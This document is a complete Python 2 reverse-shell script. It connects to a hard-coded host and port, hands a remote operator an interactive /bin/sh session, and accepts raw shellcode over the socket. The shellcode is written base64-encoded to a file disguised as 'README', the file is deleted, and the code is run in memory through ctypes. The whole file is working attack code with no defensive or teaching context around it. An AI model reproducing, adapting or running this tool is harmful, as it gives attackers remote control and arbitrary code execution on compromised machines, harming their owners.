#!/usr/bin/python -tt

from socket import *
from ctypes import *
from subprocess import *
import sys, os, select

#HOST = '192.168.1.150'
HOST = '127.0.0.1'
PORT = 9999
BANNER = "You've got shell!\n"
HELP = \
"""'exit'             : kills the shell
'!\\x41\\x41\\x41...' : executes shellcode on the remote system.\n"""
PAYFNAME = 'README'
PROMPT = '==> '

if len(sys.argv) > 1:
  if sys.argv[1] == '-x':
    PAYFNAME = sys.argv[2]
    payload = open(PAYFNAME, 'r').read().decode("base64")
    os.remove(PAYFNAME)
    memorywithpayload = create_string_buffer(payload, len(payload))
    shellcode = cast(memorywithpayload, CFUNCTYPE(c_void_p))
    shellcode()

s = socket(AF_INET, SOCK_STREAM)
try:
  s.connect((HOST, PORT))
except:
  sys.exit(2)
s.send(BANNER + PROMPT)

# This only works in linux. the statement below must be moved into the 'else'
# for windows because the 'select.select' statement is not recognized. The result
# is a loss of shell 'session' capability. i.e. 'pwd' never changes.

p = Popen(['/bin/sh'], shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)

while 1:
  data = s.recv(1024)
  if data[:1] == '!':
    payload = data[1:-1].decode("string_escape").encode("base64")
    file = open(PAYFNAME, 'w')
    file.write(payload)
    file.close()
    cmd = sys.argv[0] + ' -x ' + PAYFNAME
    proc = Popen(cmd, shell=True)
    s.send('[*] Shellcode executed.\n' + PROMPT)
  elif data[:4] == 'help':
    s.send(HELP + PROMPT)
  elif data[:4] == 'exit':
    s.close()
    sys.exit(2)
  else:
    line = ''
    p.stdin.write(data)
    while 1:
      if select.select([p.stdout], [], [], 1)[0] != []:
        line += p.stdout.readline()
      else:
        break
    s.send(line + PROMPT)

s.close()
